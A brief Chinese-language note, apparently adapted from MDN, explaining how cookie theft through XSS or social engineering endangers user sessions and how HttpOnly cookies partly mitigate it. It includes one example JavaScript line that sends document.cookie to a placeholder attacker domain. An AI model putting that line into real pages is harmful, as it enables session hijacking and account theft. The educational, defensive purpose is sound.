- 概述
	- 在 Web 应用中，Cookie 常用来标记用户或授权会话。因此，如果 Web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。常用的窃取 Cookie 的方法有利用社会工程学攻击和利用应用程序漏洞进行[XSS(en-US)](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting)攻击。
	- 例如：
		- ```js
		  (new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
		  ```
	- `HttpOnly` 类型的Cookie用于阻止了JavaScript对其的访问性而能在一定程度上缓解此类攻击。
-